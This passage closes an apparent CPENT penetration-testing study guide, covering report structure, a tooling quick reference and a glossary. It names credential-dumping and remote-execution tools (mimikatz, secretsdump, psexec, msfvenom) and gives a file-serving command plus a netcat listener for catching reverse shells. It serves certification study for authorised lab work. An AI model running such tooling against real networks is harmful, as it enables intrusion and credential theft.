2. Scope & Methodology - ranges/targets, timeframe, approach
3. Findings            - per finding: Title, Severity (CVSS), Host, Description,
                         Impact, Evidence (screenshots), Steps to Reproduce, Remediation
4. Attack Narrative    - the chained path: web -> pivot -> double pivot -> DC/domain (with a diagram)
5. Remediation Summary - prioritized fixes
6. Appendices          - command output, tool versions, full host/subnet map
```

**Tips:** the **attack narrative + network diagram** is where pivoting scores; every finding needs repro + evidence + a fix; screenshot as you go — you can't reproduce after the clock stops.

---

## 25. Tooling Quick Reference & Glossary

**Core toolset:**

```text
Recon/enum : nmap, crackmapexec, enum4linux-ng, smbmap, snmpwalk, gobuster/ffuf, wpscan, ldapdomaindump, bloodhound
Pivot      : ssh (-L/-R/-D/-J), proxychains, chisel, socat, datapipe, netsh portproxy,
             meterpreter (autoroute/portfwd/socks_proxy)
Exploit    : metasploit, msfvenom, searchsploit, sqlmap, ROPgadget/ropper/pwntools (binary), mona
AD         : impacket (GetUserSPNs/GetNPUsers/secretsdump/psexec/wmiexec/getST/ticketer),
             evil-winrm, ADRecon, PowerView, mimikatz, BloodHound
IoT        : binwalk, strings, qemu-user, nmap service scripts
Serve/catch: python3 -m http.server 80 ; nc -lvnp 443
```

**Glossary:**

- **Pivot / double pivot** — routing through one (or two chained) compromised hosts to reach segmented networks.
- **SOCKS proxy / proxychains** — generic proxy (ssh -D / meterpreter / chisel) + the tool that routes others through it.
- **autoroute** — MSF feature adding a route to an internal subnet through a Meterpreter session.
- **Tree / Forest** — contiguous-namespace domains / joined trees.
- **Administrators / Domain Admins / Enterprise Admins** — local-machine / domain / forest top groups.
- **NTDS.dit** — the AD database on the DC (domain credentials).
- **Kerberoast / AS-REP roast / delegation / PtH / DCSync / Golden & Silver Ticket** — core AD attacks & persistence.
- **Attack narrative** — the chained engagement story (graded centerpiece) — pair it with a network diagram.

---

*End of guide. All commands are for the authorized CPENT ranges / your lab only;****the IPs are placeholder examples****— substitute your range's addressing. CPENT/LPT Master is won on methodology, reliable pivoting/double-pivoting into segmented networks, chaining across the five ranges, and a clear professional report — document every step with evidence as you go.*

{% endraw %}
